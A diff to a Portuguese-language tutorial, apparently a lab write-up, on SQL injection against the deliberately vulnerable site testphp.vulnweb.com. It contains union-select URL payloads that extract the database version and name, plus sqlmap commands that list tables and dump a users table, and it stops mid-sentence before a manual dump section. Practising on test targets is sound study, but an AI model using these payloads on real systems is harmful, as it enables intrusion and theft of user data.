@@ -21,15 +21,39 @@ nos mostrando que existe um erro na Sintaxe SQL que foi passada ao banco de dado
     http://testphp.vulnweb.com/listproducts.php?cat=2%20union%20select%201,2,3,4,5,6,7,8,9,10,11
 ![image](https://github.com/user-attachments/assets/5a42ff5e-f573-4fda-abf1-cb31a4fd95d2)
 
-Que retorna as informações sem erro, agora para um segundo teste podemos solicitar a versão e verificar a apresentação da informação 
-    testphp.vulnweb.com/listproducts.php?cat=1 union select 1,version(),3,4,5,6,7,8,9,10,11
-que nos traria a informação da seguinte maneira
-![image](https://github.com/user-attachments/assets/7f501c8a-6a20-4771-862d-00567a65c4f9)
-    Para descobrir o nome do banco de dados utilizamos o Database(), então seguindo a mesma logica
-testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,database(),3,4,5,6,7,8,9,10,11
+Que retorna as informações sem erro, agora para um segundo teste podemos solicitar a versão e verificar a apresentação da informação <br>
+
+        testphp.vulnweb.com/listproducts.php?cat=1 union select 1,version(),3,4,5,6,7,8,9,10,11
+
+que nos traria a informação da seguinte maneira<br>
+    ![image](https://github.com/user-attachments/assets/7f501c8a-6a20-4771-862d-00567a65c4f9)
+    Para descobrir o nome do banco de dados utilizamos o Database(), então seguindo a mesma logica<br>
+    
+        testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,database(),3,4,5,6,7,8,9,10,11
+        
+
 ![image](https://github.com/user-attachments/assets/0ef768a6-b53b-4d4d-8f58-ba100fdf5343)
 
 
 
 
 
+
+
+ # SQLMAP
+ Com essas informações podemos utilizar um segundo metodo com o SQLMAP utilizando a ferramenta para expor os diretórios e navegar entre eles.
+ 
+         sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables -D acuart
+Ao aplicar este comando você receberá as seguintes confirmações
+    ![image](https://github.com/user-attachments/assets/4c3493ef-53f4-49ee-b1c1-6c629f218491)
+
+Obtendo este resultado podemos passar ao proximo comando que seria o *DUMP*, que sendo direcionado para a coluna USERS mostrará suas informações
+
+        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dump -T users -D acuart
+
+![image](https://github.com/user-attachments/assets/b12b2a3c-5f04-4117-b835-50e264b7abbb)
+aqui vemos que foram encontradas as informações de usuários
+
+# Dump
+Seguindo a linha de testes, todas as informações de Dump também podem ser obtidas de maneira manual já que vimos onde o navegadores responde aos comandos SQL
+    e potemos fazer esta tentativa da seguinte maneira
